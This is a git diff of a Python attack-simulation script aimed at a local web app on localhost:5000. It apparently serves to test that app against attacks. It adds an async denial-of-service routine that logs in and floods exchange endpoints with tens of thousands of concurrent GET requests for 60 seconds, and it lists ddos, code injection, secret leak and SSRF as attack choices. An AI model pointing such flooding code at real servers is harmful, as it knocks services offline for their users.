@@ -14,14 +14,9 @@ import asyncio
 attack_choices = [
     'ddos',
     'code_injection',
+    'secret_leak',
     'ssrf',
 ]
-
-# Fill in your details here to be posted to the login form.
-payload = {
-    'username': 'keanu',
-    'password': 'abc123'
-}
 
 
 class PasswordPromptAction(argparse.Action):
@@ -49,7 +44,62 @@ class PasswordPromptAction(argparse.Action):
         setattr(args, self.dest, password)
 
 
-class Hacker:
+class AsyncHttpClient:
+    def __init__(self):
+        self.session = None
+
+    async def login(self, username, password):
+        self.session = aiohttp.ClientSession()
+        try:
+            login_url = 'http://localhost:5000/login'
+            login_data = {'username': username, 'password': password}
+            response = await self.session.post(login_url, data=login_data)
+            if response.status == 200:
+                print("Login successful")
+            else:
+                print("Login failed")
+        except Exception as e:
+            print(f"Error during login: {e}")
+
+    async def get(self, url):
+        if not self.session:
+            print("Session not initialized. Please login first.")
+            return
+
+        try:
+            response = await self.session.get(url)
+            if response.status == 200:
+                data = await response.text()
+                # print(f"GET request to {url} successful. Data: {data}")
+            else:
+                print(
+                    f"GET request to {url} failed. Status code: {response.status}")
+        except Exception as e:
+            print(f"Error during GET request: {e}")
+
+    async def post(self, url, data):
+        if not self.session:
+            print("Session not initialized. Please login first.")
+            return
+
+        try:
+            response = await self.session.post(url, data=data)
+            if response.status == 200:
+                data = await response.text()
+                # print(f"POST request to {url} successful. Data: {data}")
+            else:
+                print(
+                    f"POST request to {url} failed. Status code: {response.status}")
+        except Exception as e:
+            print(f"Error during POST request: {e}")
+
+    async def close_session(self):
+        if self.session:
+            await self.session.close()
+            print("Session closed")
+
+
+class SyncHttpClient:
     def __init__(self, username, password):
         self.session = requests.Session()
         self.login_url = "http://127.0.0.1:5000/login"
@@ -90,20 +140,38 @@ args = parser.parse_args()
 
 print("Starting Attack ", args.attack)
 
-hacker = Hacker(username=args.username, password=args.password)
 
-# Record the start time
-start_time = time.time()
-duration = 60
-while True:
-    current_time = time.time()
-    elapsed_time = current_time - start_time
+async def dos_attack(username, password):
+    base_url = "http://localhost:5000"  # Replace with your server URL
 
-    # Check if the desired duration has been reached
-    if elapsed_time >= duration:
-        print(
-            f"Duration of {duration} seconds has elapsed. Exiting the loop.")
-        break
+    client = AsyncHttpClient()
+    await client.login(username, password)
 
-    # Send an authorised request.
-    r = hacker.get('http://127.0.0.1:5000/exchange/US')
+    # Example usage: send multiple GET requests in parallel
+    # Replace with your desired endpoints
+    endpoint = "exchange/US"
+    await client.get("http://localhost:5000/exchange/US")
+    # Record the start time
+
+    start_time = time.time()
+    duration = 60
+
+    while True:
+        current_time = time.time()
+        elapsed_time = current_time - start_time
+
+        # Send 10 concurrent GET requests
+        urls = ['http://localhost:5000/exchange/US', 'http://localhost:5000/exchange/TO',
+                'http://localhost:5000/exchange/LSE', 'http://localhost:5000/exchange/V'] * 10000
+        tasks = [client.get(url) for url in urls]
+        await asyncio.gather(*tasks)
+
+        # Check if the desired duration has been reached
+        if elapsed_time >= duration:
+            print(
+                f"Duration of {duration} seconds has elapsed. Exiting the loop.")
+            break
+
+    await client.close_session()
+
+asyncio.run(dos_attack(args.username, args.password))
